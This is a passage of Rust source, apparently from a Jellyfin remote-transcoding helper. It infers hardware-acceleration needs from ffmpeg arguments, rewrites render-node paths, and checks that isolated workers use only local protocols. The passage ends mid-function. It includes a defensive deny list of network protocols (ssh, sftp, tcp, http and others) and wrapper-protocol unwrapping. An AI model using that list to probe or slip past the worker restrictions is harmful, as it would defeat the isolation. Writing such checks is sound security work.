//! `ffmpeg` argument inspection, capability inference, and token-boundary render-node rewriting.

use crate::capabilities::{select_render_node, PCI_VENDOR_AMD, PCI_VENDOR_INTEL};
use crate::config::BackendAdaptMode;
use serde::{Deserialize, Serialize};
use std::fmt;

/// Hardware acceleration backend inferred from Jellyfin `ffmpeg` arguments.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum HwAccel {
    Vaapi,
    Qsv,
    Cuda,
    OpenCl,
    Vulkan,
    Drm,
}

impl HwAccel {
    pub const fn as_str(self) -> &'static str {
        match self {
            Self::Vaapi => "vaapi",
            Self::Qsv => "qsv",
            Self::Cuda => "cuda",
            Self::OpenCl => "opencl",
            Self::Vulkan => "vulkan",
            Self::Drm => "drm",
        }
    }

    /// Priority when choosing the single primary `hwaccel` for mixed pipelines
    /// (for example `-init_hw_device vaapi=va:... -init_hw_device qsv=qs@va` -> `Qsv`).
    const fn primary_rank(self) -> u8 {
        match self {
            Self::Qsv => 6,
            Self::Cuda => 5,
            Self::Vaapi => 4,
            Self::Vulkan => 3,
            Self::OpenCl => 2,
            Self::Drm => 1,
        }
    }
}

impl fmt::Display for HwAccel {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.as_str())
    }
}

/// Hardware and encoder requirements inferred from a Jellyfin `ffmpeg` invocation.
#[derive(Debug, Clone, PartialEq, Eq, Default, Serialize, Deserialize)]
pub struct Capability {
    /// Primary hardware acceleration family required by this job, if any.
    pub hwaccel: Option<HwAccel>,
    /// All distinct hardware acceleration backends referenced in flags, decoders, encoders, or filters.
    pub required_hwaccels: Vec<HwAccel>,
    /// Output video encoder name (e.g. `h264_vaapi`, `hevc_qsv`, `h264_nvenc`, `libx264`, `copy`).
    pub encoder: Option<String>,
    /// Input video decoder name specified before `-i` (normalized lowercase), if any.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub decoder: Option<String>,
    /// Distinct hardware-specific filters referenced in video filtergraphs (e.g. `scale_vaapi`, `vpp_qsv`).
    pub filters: Vec<String>,
    /// Distinct `/dev/dri/renderD*` device paths referenced in device-option positions.
    pub render_nodes: Vec<String>,
    /// `true` when the video filtergraph references `tonemap_vaapi` (Intel VA-API VPP only).
    #[serde(default)]
    pub requires_vaapi_tonemap: bool,
}

fn normalize_hw_decoder_codec(raw: &str) -> Option<&'static str> {
    match raw.trim().to_ascii_lowercase().as_str() {
        "h264" | "h264_qsv" | "h264_cuvid" | "avc" => Some("h264"),
        "hevc" | "hevc_qsv" | "hevc_cuvid" | "h265" => Some("hevc"),
        "av1" | "av1_qsv" | "av1_cuvid" => Some("av1"),
        "vp9" | "vp9_qsv" | "vp9_cuvid" => Some("vp9"),
        "vp8" | "vp8_qsv" | "vp8_cuvid" => Some("vp8"),
        "mpeg2" | "mpeg2video" | "mpeg2_qsv" | "mpeg2_cuvid" => Some("mpeg2video"),
        "vc1" | "vc1_qsv" | "vc1_cuvid" => Some("vc1"),
        "mjpeg" | "mjpeg_qsv" | "mjpeg_cuvid" => Some("mjpeg"),
        _ => None,
    }
}

impl Capability {
    /// Returns `true` if the command requires any hardware backend, hardware filter, or render node.
    pub fn requires_hardware(&self) -> bool {
        self.hwaccel.is_some()
            || !self.required_hwaccels.is_empty()
            || !self.filters.is_empty()
            || !self.render_nodes.is_empty()
    }

    /// Returns `true` when the command uses only CPU/software paths.
    pub fn is_software_only(&self) -> bool {
        !self.requires_hardware()
    }

    /// Returns the required encoder name when re-encoding video (ignoring stream-copy `copy`).
    pub fn required_encoder(&self) -> Option<&str> {
        self.encoder
            .as_deref()
            .filter(|enc| !enc.is_empty() && !enc.eq_ignore_ascii_case("copy"))
    }

    /// Returns the normalized base hardware decoder codec (`"av1"`, `"hevc"`, `"h264"`, `"vp9"`,
    /// `"vp8"`, `"mpeg2video"`, `"vc1"`, `"mjpeg"`) when an input video decoder is specified and
    /// hardware decoding is requested.
    pub fn required_hw_decoder(&self) -> Option<&str> {
        let dec = self.decoder.as_deref()?;
        let has_hw_decode = self.requires_hardware()
            && (self.required_hwaccels.iter().any(|hw| {
                matches!(
                    hw,
                    HwAccel::Vaapi | HwAccel::Qsv | HwAccel::Cuda | HwAccel::Vulkan
                )
            }) || dec.ends_with("_qsv")
                || dec.ends_with("_cuvid"));
        if !has_hw_decode {
            return None;
        }
        normalize_hw_decoder_codec(dec)
    }
}

/// Local-only FFmpeg protocol whitelist enforced on transcode workers.
pub const WORKER_LOCAL_PROTOCOL_WHITELIST: &str = "file,pipe,fd,crypto,data,subfile";

/// Individual FFmpeg protocols allowed on isolated transcode workers.
pub const ALLOWED_LOCAL_PROTOCOLS: &[&str] = &["file", "pipe", "fd", "crypto", "data", "subfile"];

const MAX_PROTOCOL_WRAPPER_DEPTH: usize = 8;

/// FFmpeg protocols that open network connections or local IPC sockets.
const NETWORK_PROTOCOLS: &[&str] = &[
    "http",
    "https",
    "httpproxy",
    "rtsp",
    "rtsps",
    "rtmp",
    "rtmps",
    "rtmpt",
    "rtmpe",
    "rtmpte",
    "rtmpts",
    "librtmp",
    "librtmpe",
    "librtmps",
    "librtmpt",
    "librtmpte",
    "rtp",
    "srtp",
    "prompeg",
    "udp",
    "udplite",
    "tcp",
    "tls",
    "dtls",
    "srt",
    "libsrt",
    "rist",
    "librist",
    "mms",
    "mmsh",
    "mmst",
    "ftp",
    "ftps",
    "sftp",
    "ssh",
    "libssh",
    "smb",
    "libsmbclient",
    "nfs",
    "dav",
    "davs",
    "gopher",
    "gophers",
    "icecast",
    "shout",
    "sctp",
    "unix",
    "zmq",
    "amqp",
    "ipfs",
    "ipns",
    "ws",
    "wss",
    "applehttp",
    "sap",
];

/// Nested FFmpeg wrapper protocols whose inner URL specification must be inspected recursively.
const WRAPPER_PROTOCOLS: &[&str] = &[
    "async", "cache", "crypto", "subfile", "hls", "tee", "md5", "concatf",
];

/// Base local-only FFmpeg protocols that do not wrap another URL.
const LOCAL_BASE_PROTOCOLS: &[&str] = &["file", "pipe", "fd", "data"];

/// Validates an exact Linux DRM render node path (`/dev/dri/renderD<digits>`).
pub fn is_valid_render_node_path(path: &str) -> bool {
    path.strip_prefix("/dev/dri/renderD")
        .is_some_and(|digits| !digits.is_empty() && digits.bytes().all(|b| b.is_ascii_digit()))
}

const STANDALONE_PROBE_FLAGS: &[&str] = &[
    "-version",
    "-buildconf",
    "-formats",
    "-muxers",
    "-demuxers",
    "-devices",
    "-codecs",
    "-decoders",
    "-encoders",
    "-bsfs",
    "-protocols",
    "-filters",
    "-pix_fmts",
    "-layouts",
    "-sample_fmts",
    "-dispositions",
    "-colors",
    "-hwaccels",
    "-h",
    "-?",
    "-help",
    "--help",
    "-L",
    "-license",
    "-sources",
    "-sinks",
];

const KNOWN_BOOLEAN_FLAGS: &[&str] = &[
    "-y",
    "-n",
    "-nostdin",
    "-stdin",
    "-stats",
    "-nostats",
    "-hide_banner",
    "-re",
    "-vn",
    "-an",
    "-sn",
    "-dn",
    "-report",
    "-benchmark",
    "-benchmark_all",
    "-copyts",
    "-start_at_zero",
    "-shortest",
    "-fix_sub_duration",
    "-noautorotate",
    "-autorotate",
    "-ignore_unknown",
    "-copy_unknown",
    "-accurate_seek",
    "-noaccurate_seek",
    "-bitexact",
    "-dump",
    "-hex",
    "-xerror",
    "-reconnect",
    "-reconnect_streamed",
    "-reconnect_at_eof",
    "-reconnect_on_network_error",
    "-reinit_filter",
];

/// Returns `true` when `flag` is an `ffmpeg` CLI option that consumes the following argv token as its value.
fn option_takes_value(flag: &str) -> bool {
    if !flag.starts_with('-') || flag == "-" || flag == "--" {
        return false;
    }
    if STANDALONE_PROBE_FLAGS.contains(&flag) || KNOWN_BOOLEAN_FLAGS.contains(&flag) {
        return false;
    }
    // Common prefix-parameterized ffmpeg options (e.g. `-c:v:0`, `-codec:v`, `-filter:v:0`,
    // `-hwaccel:v:0`, `-metadata:s:a:0`, `-b:v:0`, `-bsf:v`, `-tag:v`, `-profile:v`).
    for prefix in [
        "-c:",
        "-codec:",
        "-filter:",
        "-filter_script:",
        "-hwaccel:",
        "-hwaccel_device:",
        "-hwaccel_output_format:",
        "-metadata:",
        "-disposition:",
        "-b:",
        "-q:",
        "-qscale:",
        "-profile:",
        "-level:",
        "-bsf:",
        "-tag:",
        "-frames:",
        "-fps_mode:",
        "-r:",
        "-s:",
        "-aspect:",
        "-pix_fmt:",
        "-maxrate:",
        "-bufsize:",
        "-g:",
        "-keyint_min:",
        "-sc_threshold:",
        "-rc-lookahead:",
        "-x264-params:",
        "-x265-params:",
        "-svtav1-params:",
        "-threads:",
        "-preset:",
        "-global_quality:",
        "-qp:",
    ] {
        if flag.starts_with(prefix) {
            return true;
        }
    }

    matches!(
        flag,
        "-i" | "-f"
            | "-c"
            | "-codec"
            | "-vcodec"
            | "-acodec"
            | "-scodec"
            | "-hwaccel"
            | "-hwaccel_device"
            | "-hwaccel_output_format"
            | "-hwaccel_flags"
            | "-init_hw_device"
            | "-filter_hw_device"
            | "-vaapi_device"
            | "-qsv_device"
            | "-vf"
            | "-af"
            | "-filter"
            | "-filter_script"
            | "-filter_complex"
            | "-filter_complex_script"
            | "-lavfi"
            | "-protocol_whitelist"
            | "-protocol_blacklist"
            | "-http_proxy"
            | "-sdp_file"
            | "-map"
            | "-map_metadata"
            | "-map_chapters"
            | "-metadata"
            | "-disposition"
            | "-ss"
            | "-sseof"
            | "-t"
            | "-to"
            | "-itsoffset"
            | "-loglevel"
            | "-v"
            | "-analyzeduration"
            | "-probesize"
            | "-fflags"
            | "-flags"
            | "-movflags"
            | "-threads"
            | "-filter_threads"
            | "-filter_complex_threads"
            | "-max_muxing_queue_size"
            | "-max_delay"
            | "-avoid_negative_ts"
            | "-copytb"
            | "-sub_charenc"
            | "-b"
            | "-maxrate"
            | "-bufsize"
            | "-crf"
            | "-qp"
            | "-global_quality"
            | "-preset"
            | "-tune"
            | "-rc_mode"
            | "-low_power"
            | "-async_depth"
            | "-look_ahead"
            | "-look_ahead_depth"
            | "-extbrc"
            | "-mbbrc"
            | "-adaptive_i"
            | "-adaptive_b"
            | "-b_strategy"
            | "-bf"
            | "-refs"
            | "-g"
            | "-keyint_min"
            | "-sc_threshold"
            | "-r"
            | "-s"
            | "-aspect"
            | "-pix_fmt"
            | "-profile"
            | "-level"
            | "-ac"
            | "-ar"
            | "-ab"
            | "-aq"
            | "-vframes"
            | "-aframes"
            | "-dframes"
            | "-frames"
            | "-fps_mode"
            | "-vsync"
            | "-async"
            | "-hls_time"
            | "-hls_list_size"
            | "-hls_playlist_type"
            | "-hls_flags"
            | "-hls_segment_type"
            | "-hls_segment_filename"
            | "-hls_fmp4_init_filename"
            | "-hls_init_time"
            | "-start_number"
            | "-segment_time"
            | "-segment_list"
            | "-segment_list_type"
            | "-segment_format"
            | "-segment_times"
            | "-force_key_frames"
            | "-color_primaries"
            | "-color_trc"
            | "-colorspace"
            | "-color_range"
            | "-strict"
            | "-progress"
            | "-vstats_file"
            | "-headers"
            | "-user_agent"
            | "-cookies"
            | "-timeout"
            | "-rw_timeout"
            | "-reconnect_delay_max"
            | "-tls_verify"
            | "-canvas_size"
            | "-x264opts"
            | "-x264-params"
            | "-x265-params"
            | "-svtav1-params"
            | "-rc"
            | "-spatial-aq"
            | "-temporal-aq"
            | "-b_ref_mode"
            | "-cq"
            | "-qmin"
            | "-qmax"
            | "-compression_level"
            | "-max_error_rate"
            | "-abort_on"
            | "-stream_loop"
            | "-extra_hw_frames"
            | "-hwaccel_lax_profile_check"
    )
}

fn is_video_codec_flag(flag: &str) -> bool {
    flag == "-vcodec"
        || flag == "-c:v"
        || flag == "-codec:v"
        || flag.starts_with("-c:v:")
        || flag.starts_with("-codec:v:")
}

fn is_video_filter_flag(flag: &str) -> bool {
    flag == "-vf"
        || flag == "-filter:v"
        || flag.starts_with("-filter:v:")
        || flag == "-filter_complex"
        || flag == "-lavfi"
}

fn is_hwaccel_flag(flag: &str) -> bool {
    flag == "-hwaccel" || flag.starts_with("-hwaccel:")
}

fn is_hwaccel_output_format_flag(flag: &str) -> bool {
    flag == "-hwaccel_output_format" || flag.starts_with("-hwaccel_output_format:")
}

fn is_hwaccel_device_flag(flag: &str) -> bool {
    flag == "-hwaccel_device" || flag.starts_with("-hwaccel_device:")
}

/// Returns `true` if the `ffmpeg` invocation is a probe/info call (or has no `-i <input>`)
/// and must therefore always run locally without hitting the remote transcode dispatcher.
pub fn is_probe<S: AsRef<str>>(args: &[S]) -> bool {
    if args.is_empty() {
        return true;
    }

    let mut has_input = false;
    let mut i = 0usize;
    while i < args.len() {
        let arg = args[i].as_ref();
        if arg == "--" {
            break;
        }
        if STANDALONE_PROBE_FLAGS.contains(&arg) {
            return true;
        }
        if arg == "-init_hw_device" {
            if let Some(val) = args.get(i + 1).map(AsRef::as_ref) {
                if val.eq_ignore_ascii_case("list") {
                    return true;
                }
                i += 2;
                continue;
            }
            return true;
        }
        if arg == "-i" {
            if let Some(val) = args.get(i + 1).map(AsRef::as_ref) {
                if !val.is_empty() {
                    has_input = true;
                }
                i += 2;
                continue;
            }
            return true;
        }
        if option_takes_value(arg) {
            i += 2;
            continue;
        }
        i += 1;
    }

    !has_input
}

fn parse_hwaccel_name(raw: &str) -> Option<HwAccel> {
    match raw.trim().to_ascii_lowercase().as_str() {
        "vaapi" | "vaapi_vld" => Some(HwAccel::Vaapi),
        "qsv" => Some(HwAccel::Qsv),
        "cuda" | "cuvid" | "nvdec" => Some(HwAccel::Cuda),
        "opencl" => Some(HwAccel::OpenCl),
        "vulkan" => Some(HwAccel::Vulkan),
        "drm" | "drm_prime" => Some(HwAccel::Drm),
        _ => None,
    }
}

fn hwaccel_from_codec_name(codec: &str) -> Option<HwAccel> {
    let lower = codec.trim().to_ascii_lowercase();
    if lower.ends_with("_vaapi") {
        Some(HwAccel::Vaapi)
    } else if lower.ends_with("_qsv") {
        Some(HwAccel::Qsv)
    } else if lower.ends_with("_nvenc") || lower.ends_with("_cuvid") || lower.ends_with("_cuda") {
        Some(HwAccel::Cuda)
    } else if lower.ends_with("_vulkan") {
        Some(HwAccel::Vulkan)
    } else {
        None
    }
}

/// Parses an `-init_hw_device` specification (`type[=name][:device[,opts...]]` or `type[=name]@source`).
fn parse_init_hw_device(spec: &str) -> (Option<HwAccel>, Option<&str>) {
    let (head, rest_opt) = match spec.find(':') {
        Some(colon_idx) => {
            let before = &spec[..colon_idx];
            // If `@source` appears before `:`, there is no `:device` path.
            if before.contains('@') {
                (spec, None)
            } else {
                (before, Some(&spec[colon_idx + 1..]))
            }
        }
        None => (spec, None),
    };

    let type_and_name = head.split('@').next().unwrap_or(head);
    let hw_type = type_and_name.split('=').next().unwrap_or(type_and_name);
    let hwaccel = parse_hwaccel_name(hw_type);

    let device = rest_opt
        .map(|rest| rest.split(',').next().unwrap_or(rest))
        .filter(|dev| !dev.is_empty());

    (hwaccel, device)
}

/// Splits an `ffmpeg` filtergraph into individual filter expressions on `,` and `;`,
/// respecting `'...'`, `"..."`, and `\` escaping so paths inside `subtitles=...` are never split.
fn split_filtergraph_nodes(graph: &str) -> Vec<&str> {
    let mut nodes = Vec::new();
    let bytes = graph.as_bytes();
    let mut start = 0usize;
    let mut i = 0usize;
    let mut in_single = false;
    let mut in_double = false;
    let mut escaped = false;

    while i < bytes.len() {
        let b = bytes[i];
        if escaped {
            escaped = false;
            i += 1;
            continue;
        }
        match b {
            b'\\' if !in_single => {
                escaped = true;
            }
            b'\'' if !in_double => {
                in_single = !in_single;
            }
            b'"' if !in_single => {
                in_double = !in_double;
            }
            b',' | b';' if !in_single && !in_double => {
                nodes.push(&graph[start..i]);
                start = i + 1;
            }
            _ => {}
        }
        i += 1;
    }
    if start <= graph.len() {
        nodes.push(&graph[start..]);
    }
    nodes
}

/// Strips leading `[pad]` labels from a single filter node expression.
fn strip_leading_pads(mut s: &str) -> &str {
    loop {
        s = s.trim_start();
        if !s.starts_with('[') {
            return s;
        }
        let Some(end) = s.find(']') else {
            return s;
        };
        s = &s[end + 1..];
    }
}

/// Splits a filter node into `(filter_name, Option<filter_args>)`, stripping `@instance` and trailing `[pads]`.
fn parse_filter_node(node: &str) -> Option<(&str, Option<&str>)> {
    let trimmed = strip_leading_pads(node).trim();
    if trimmed.is_empty() {
        return None;
    }

    // Find first `=` or `[` outside quotes to isolate the filter name.
    let bytes = trimmed.as_bytes();
    let mut in_single = false;
    let mut in_double = false;
    let mut escaped = false;
    let mut split_eq: Option<usize> = None;
    let mut trailing_pad_start: Option<usize> = None;

    for (idx, &b) in bytes.iter().enumerate() {
        if escaped {
            escaped = false;
            continue;
        }
        match b {
            b'\\' if !in_single => escaped = true,
            b'\'' if !in_double => in_single = !in_single,
            b'"' if !in_single => in_double = !in_double,
            b'=' if !in_single && !in_double && split_eq.is_none() => {
                split_eq = Some(idx);
                break;
            }
            b'[' if !in_single && !in_double && split_eq.is_none() => {
                trailing_pad_start = Some(idx);
                break;
            }
            _ => {}
        }
    }

    let (raw_name, raw_args) = if let Some(eq_idx) = split_eq {
        (&trimmed[..eq_idx], Some(&trimmed[eq_idx + 1..]))
    } else if let Some(pad_idx) = trailing_pad_start {
        (&trimmed[..pad_idx], None)
    } else {
        (trimmed, None)
    };

    // Strip optional `@instance_name` suffix from the filter name.
    let name = raw_name.split('@').next().unwrap_or(raw_name).trim();
    if name.is_empty() {
        return None;
    }

    // Strip any trailing `[output_pad]` labels from `raw_args` (outside quotes).
    let args = raw_args.map(|a| {
        let mut cut = a.len();
        let ab = a.as_bytes();
        let mut s_q = false;
        let mut d_q = false;
        let mut esc = false;
        let mut last_unquoted_bracket = None;
        let mut closed_pad = false;
        for (idx, &b) in ab.iter().enumerate() {
            if esc {
                esc = false;
                continue;
            }
            match b {
                b'\\' if !s_q => esc = true,
                b'\'' if !d_q => s_q = !s_q,
                b'"' if !s_q => d_q = !d_q,
                b'[' if !s_q && !d_q => {
                    if last_unquoted_bracket.is_none() {
                        last_unquoted_bracket = Some(idx);
                    }
                    closed_pad = false;
                }
                b']' if !s_q && !d_q => closed_pad = last_unquoted_bracket.is_some(),
                other if !s_q && !d_q && closed_pad && !other.is_ascii_whitespace() => {
                    last_unquoted_bracket = None;
                    closed_pad = false;
                }
                _ => {}
            }
        }
        if let Some(idx) = last_unquoted_bracket {
            if a[idx..].trim_end().ends_with(']') {
                cut = idx;
            }
        }
        a[..cut].trim()
    });

    Some((name, args))
}

fn hwaccel_from_filter_name(name_lower: &str) -> Option<HwAccel> {
    if name_lower.ends_with("_vaapi") {
        Some(HwAccel::Vaapi)
    } else if name_lower.ends_with("_qsv") {
        Some(HwAccel::Qsv)
    } else if name_lower.ends_with("_cuda")
        || name_lower.ends_with("_cuvid")
        || name_lower.ends_with("_npp")
    {
        Some(HwAccel::Cuda)
    } else if name_lower.ends_with("_opencl") {
        Some(HwAccel::OpenCl)
    } else if name_lower.ends_with("_vulkan") || name_lower == "libplacebo" {
        Some(HwAccel::Vulkan)
    } else {
        None
    }
}

fn push_unique<T: PartialEq>(vec: &mut Vec<T>, item: T) {
    if !vec.contains(&item) {
        vec.push(item);
    }
}

/// Inspects a video filtergraph string without ever scanning subtitle/file path option values.
fn inspect_filtergraph(graph: &str, cap: &mut Capability) {
    for raw_node in split_filtergraph_nodes(graph) {
        let Some((name, args_opt)) = parse_filter_node(raw_node) else {
            continue;
        };
        let lower = name.to_ascii_lowercase();

        if lower == "tonemap_vaapi" {
            cap.requires_vaapi_tonemap = true;
        }

        if let Some(hw) = hwaccel_from_filter_name(&lower) {
            push_unique(&mut cap.required_hwaccels, hw);
            push_unique(&mut cap.filters, lower);
            continue;
        }

        // Only inspect structured hardware options on `hwmap`, `hwupload`, and `format` filters.
        // Subtitle/file filters (`subtitles`, `ass`, `drawtext`, `movie`, `lut3d`, ...) are never
        // scanned for hardware keywords so filenames like `/media/vaapi_cuda.ass` never false-match.
        match lower.as_str() {
            "hwmap" | "hwupload" => {
                if let Some(args) = args_opt {
                    for kv in args.split(':') {
                        if let Some((k, v)) = kv.split_once('=') {
                            if k.trim().eq_ignore_ascii_case("derive_device") {
                                if let Some(hw) = parse_hwaccel_name(v) {
                                    push_unique(&mut cap.required_hwaccels, hw);
                                    push_unique(
                                        &mut cap.filters,
                                        format!("{lower}:{}", hw.as_str()),
                                    );
                                }
                            }
                        }
                    }
                }
            }
            "format" => {
                if let Some(args) = args_opt {
                    let pix_list = args
                        .split(':')
                        .next()
                        .unwrap_or(args)
                        .strip_prefix("pix_fmts=")
                        .unwrap_or(args.split(':').next().unwrap_or(args));
                    for fmt_tok in pix_list.split('|') {
                        if let Some(hw) = parse_hwaccel_name(fmt_tok) {
                            push_unique(&mut cap.required_hwaccels, hw);
                        }
                    }
                }
            }
            _ => {}
        }
    }
}

/// Infers required hardware acceleration, video encoder, hardware filters, and render nodes
/// from real Jellyfin `ffmpeg` command-line arguments.
pub fn required_capability<S: AsRef<str>>(args: &[S]) -> Capability {
    let mut cap = Capability::default();

    // Locate the index of the LAST `-i` option so we accurately separate input decoders from
    // output encoders (in ffmpeg CLI semantics, options before `-i` apply to inputs, options
    // after the last `-i` apply to outputs).
    let mut last_input_idx: Option<usize> = None;
    {
        let mut idx = 0usize;
        while idx < args.len() {
            let arg = args[idx].as_ref();
            if arg == "--" {
                break;
            }
            if arg == "-i" {
                last_input_idx = Some(idx);
                idx += 2;
                continue;
            }
            if option_takes_value(arg) {
                idx += 2;
                continue;
            }
            idx += 1;
        }
    }

    let mut explicit_primary_hwaccel: Option<HwAccel> = None;

    let mut i = 0usize;
    while i < args.len() {
        let arg = args[i].as_ref();
        if arg == "--" {
            break;
        }
        let next = args.get(i + 1).map(AsRef::as_ref);

        if is_hwaccel_flag(arg) {
            if let Some(val) = next {
                if let Some(hw) = parse_hwaccel_name(val) {
                    push_unique(&mut cap.required_hwaccels, hw);
                    explicit_primary_hwaccel = Some(hw);
                }
                i += 2;
                continue;
            }
        } else if is_hwaccel_output_format_flag(arg) {
            if let Some(val) = next {
                if let Some(hw) = parse_hwaccel_name(val) {
                    push_unique(&mut cap.required_hwaccels, hw);
                }
                i += 2;
                continue;
            }
        } else if arg == "-init_hw_device" {
            if let Some(val) = next {
                let (hw_opt, dev_opt) = parse_init_hw_device(val);
                if let Some(hw) = hw_opt {
                    push_unique(&mut cap.required_hwaccels, hw);
                }
                if let Some(dev) = dev_opt.filter(|d| is_valid_render_node_path(d)) {
                    push_unique(&mut cap.render_nodes, dev.to_string());
                }
                i += 2;
                continue;
            }
        } else if arg == "-vaapi_device" {
            push_unique(&mut cap.required_hwaccels, HwAccel::Vaapi);
            if let Some(val) = next {
                if is_valid_render_node_path(val) {
                    push_unique(&mut cap.render_nodes, val.to_string());
                }
                i += 2;
                continue;
            }
        } else if arg == "-qsv_device" {
            push_unique(&mut cap.required_hwaccels, HwAccel::Qsv);
            if let Some(val) = next {
                if is_valid_render_node_path(val) {
                    push_unique(&mut cap.render_nodes, val.to_string());
                }
                i += 2;
                continue;
            }
        } else if is_hwaccel_device_flag(arg) {
            if let Some(val) = next {
                if is_valid_render_node_path(val) {
                    push_unique(&mut cap.render_nodes, val.to_string());
                }
                i += 2;
                continue;
            }
        } else if is_video_codec_flag(arg) {
            if let Some(val) = next {
                let is_output_section = last_input_idx.is_none_or(|input_pos| i > input_pos + 1);
                if is_output_section {
                    if !val.eq_ignore_ascii_case("copy") || cap.encoder.is_none() {
                        cap.encoder = Some(val.to_string());
                    }
                } else {
                    let lower = val.trim().to_ascii_lowercase();
                    if !lower.is_empty() && lower != "copy" {
                        cap.decoder = Some(lower);
                    }
                }
                if let Some(hw) = hwaccel_from_codec_name(val) {
                    push_unique(&mut cap.required_hwaccels, hw);
                }
                i += 2;
                continue;
            }
        } else if is_video_filter_flag(arg) {
            if let Some(val) = next {
                inspect_filtergraph(val, &mut cap);
                i += 2;
                continue;
            }
        } else if option_takes_value(arg) {
            i += 2;
            continue;
        }

        i += 1;
    }

    // Choose deterministic primary `hwaccel`:
    // 1. Output hardware encoder backend (e.g. `hevc_qsv` -> `Qsv`, `h264_vaapi` -> `Vaapi`, `h264_nvenc` -> `Cuda`)
    // 2. Explicit `-hwaccel` option
    // 3. Highest-priority backend in `required_hwaccels`
    cap.hwaccel = cap
        .encoder
        .as_deref()
        .and_then(hwaccel_from_codec_name)
        .or(explicit_primary_hwaccel)
        .or_else(|| {
            cap.required_hwaccels
                .iter()
                .copied()
                .max_by_key(|hw| hw.primary_rank())
        });

    cap
}

fn rewrite_init_hw_device_spec(spec: &str, from: Option<&str>, to: &str) -> String {
    let Some(colon_idx) = spec.find(':') else {
        return spec.to_string();
    };
    let head = &spec[..colon_idx];
    // Derived device spec (`qsv=qs@va`) has no `:device` path.
    if head.contains('@') {
        return spec.to_string();
    }
    let rest = &spec[colon_idx + 1..];
    let (device, tail) = match rest.find(',') {
        Some(comma_idx) => (&rest[..comma_idx], &rest[comma_idx..]),
        None => (rest, ""),
    };

    let should_replace = match from {
        Some(exact_from) => device == exact_from,
        None => is_valid_render_node_path(device),
    };
    if should_replace {
        format!("{head}:{to}{tail}")
    } else {
        spec.to_string()
    }
}

fn rewrite_render_node_internal<S: AsRef<str>>(
    args: &[S],
    from: Option<&str>,
    to: &str,
) -> Vec<String> {
    if let Some(f) = from {
        if f.is_empty() || f == to {
            return args.iter().map(|s| s.as_ref().to_string()).collect();
        }
    }

    let mut out: Vec<String> = Vec::with_capacity(args.len());
    let mut i = 0usize;
    let mut after_double_dash = false;

    while i < args.len() {
        let arg = args[i].as_ref();
        out.push(arg.to_string());

        if after_double_dash {
            i += 1;
            continue;
        }
        if arg == "--" {
            after_double_dash = true;
            i += 1;
            continue;
        }

        if arg == "-vaapi_device" || arg == "-qsv_device" || is_hwaccel_device_flag(arg) {
            if let Some(val) = args.get(i + 1).map(AsRef::as_ref) {
                let matches = match from {
                    Some(exact_from) => val == exact_from,
                    None => is_valid_render_node_path(val),
                };
                out.push(if matches {
                    to.to_string()
                } else {
                    val.to_string()
                });
                i += 2;
                continue;
            }
        } else if arg == "-init_hw_device" {
            if let Some(val) = args.get(i + 1).map(AsRef::as_ref) {
                out.push(rewrite_init_hw_device_spec(val, from, to));
                i += 2;
                continue;
            }
        } else if option_takes_value(arg) {
            // Preserve all non-device option values untouched (inputs, metadata, filtergraphs, subtitles).
            if let Some(val) = args.get(i + 1).map(AsRef::as_ref) {
                out.push(val.to_string());
                i += 2;
                continue;
            }
        }

        i += 1;
    }

    out
}

/// Replaces exact render-node device tokens matching `from` with `to` ONLY in recognized
/// `ffmpeg` hardware device positions (`-vaapi_device`, `-qsv_device`, `-hwaccel_device*`,
/// and the `:device` slot of `-init_hw_device`).
///
/// Media paths, subtitle paths, filter arguments, metadata values, and prefix-colliding tokens
/// such as `/dev/dri/renderD1280` are never modified.
pub fn rewrite_render_node<S: AsRef<str>>(args: &[S], from: &str, to: &str) -> Vec<String> {
    rewrite_render_node_internal(args, Some(from), to)
}

/// Replaces any valid `/dev/dri/renderD<digits>` device token in recognized hardware device
/// positions with `to`.
pub fn rewrite_any_render_node<S: AsRef<str>>(args: &[S], to: &str) -> Vec<String> {
    rewrite_render_node_internal(args, None, to)
}

fn is_valid_uri_scheme(scheme: &str) -> bool {
    let mut bytes = scheme.bytes();
    let Some(first) = bytes.next() else {
        return false;
    };
    if !first.is_ascii_alphabetic() {
        return false;
    }
    bytes.all(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'.' | b'-'))
}

fn is_protocol_whitelist_flag(flag: &str) -> bool {
    flag == "-protocol_whitelist"
        || flag.starts_with("-protocol_whitelist:")
        || flag.starts_with("-protocol_whitelist=")
}

fn is_any_filter_flag(flag: &str) -> bool {
    flag == "-vf"
        || flag == "-af"
        || flag == "-filter"
        || flag.starts_with("-filter:")
        || flag == "-filter_complex"
        || flag == "-lavfi"
}

fn is_url_option_flag(flag: &str) -> bool {
    matches!(
        flag,
        "-progress"
            | "-sdp_file"
            | "-hls_segment_filename"
            | "-hls_fmp4_init_filename"
            | "-segment_list"
            | "-filter_complex_script"
            | "-filter_script"
    ) || flag.starts_with("-filter_script:")
}

/// Returns `true` when a `-protocol_whitelist` value contains only allowed local-only protocols.
pub fn is_allowed_local_protocol_whitelist(value: &str) -> bool {
    let mut count = 0usize;
    for raw_proto in value.split(',') {
        let proto = raw_proto.trim().to_ascii_lowercase();
        if proto.is_empty() || !ALLOWED_LOCAL_PROTOCOLS.contains(&proto.as_str()) {
            return false;
        }
        count += 1;
    }
    count > 0
}

fn spec_uses_network_protocol(spec: &str, depth: usize) -> bool {
    if depth >= MAX_PROTOCOL_WRAPPER_DEPTH {
        return true;
    }
    if spec.is_empty()
        || spec == "-"
        || spec.starts_with('/')
        || spec.starts_with("./")
        || spec.starts_with("../")
    {
        return false;
    }

    let Some((raw_proto, rest)) = spec.split_once(':') else {
        return false;
    };

    // FFmpeg `subfile` supports inline option syntax before `:`, e.g.
    // `subfile,,start,0,end,1024,,:http://example.com/a.mkv`.
    if raw_proto.eq_ignore_ascii_case("subfile")
        || raw_proto.to_ascii_lowercase().starts_with("subfile,")
    {
        return spec_uses_network_protocol(rest, depth + 1);
    }

    if !is_valid_uri_scheme(raw_proto) {
        return false;
    }

    let proto = raw_proto.to_ascii_lowercase();

    if rest.starts_with("//") {
        if proto == "file" {
            return false;
        }
        if proto.contains('+') {
            let parts: Vec<&str> = proto.split('+').collect();
            let all_local_chain = parts.len() >= 2
                && parts.last() == Some(&"file")
                && parts[..parts.len() - 1]
                    .iter()
                    .all(|p| matches!(*p, "crypto" | "async" | "cache" | "subfile"));
            return !all_local_chain;
        }
